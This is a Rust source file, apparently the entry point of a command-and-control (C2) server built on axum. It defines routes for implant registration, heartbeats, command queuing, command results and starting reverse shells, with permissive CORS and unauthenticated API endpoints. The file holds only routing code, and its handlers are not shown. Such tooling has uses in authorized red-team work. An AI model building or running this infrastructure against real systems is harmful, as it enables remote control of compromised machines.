use axum::{
    Router,
    routing::{get, post},
    serve,
};
use tokio::net::TcpListener;
use tower_http::cors::CorsLayer;
use tower_http::services::ServeDir;
use tower_cookies::CookieManagerLayer;

mod state;
mod auth;
mod handlers;

use state::ServerState;
use auth::{login_get, login_post, auth_middleware};
use handlers::{api, web};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let state = ServerState::new();

    // Routes that require authentication
    let protected_routes = Router::new()
        .route("/", get(web::index))
        .route("/client/:id", get(web::client_detail))
        .route_layer(axum::middleware::from_fn_with_state(
            state.clone(),
            auth_middleware,
        ));

    // API routes (unprotected or with their own auth)
    let api_routes = Router::new()
        .route("/api/register", post(api::register_client))
        .route("/api/heartbeat", post(api::handle_heartbeat))
        .route("/api/commands/:client_id", get(api::get_commands))
        .route("/api/command_result", post(api::handle_command_result))
        .route("/api/shell_data", post(api::handle_shell_data))
        .route("/api/clients", get(api::api_clients))
        .route("/api/clients/:client_id/commands", post(api::send_command))
        .route("/api/clients/:client_id/results", get(api::api_command_results))
        .route("/api/clients/:client_id/reverse_shell", post(api::initiate_reverse_shell));

    // Main application router
    let app = Router::new()
        .route("/login", get(login_get).post(login_post))
        .merge(protected_routes)
        .merge(api_routes)
        // Static files
        .nest_service("/static", ServeDir::new("web/static"))
        .layer(CorsLayer::permissive())
        .layer(CookieManagerLayer::new())
        .with_state(state);

    println!("C2 Server starting on http://0.0.0.0:8080");

    let listener = TcpListener::bind("0.0.0.0:8080").await?;
    
    serve(listener, app).await?;

    Ok(())
}
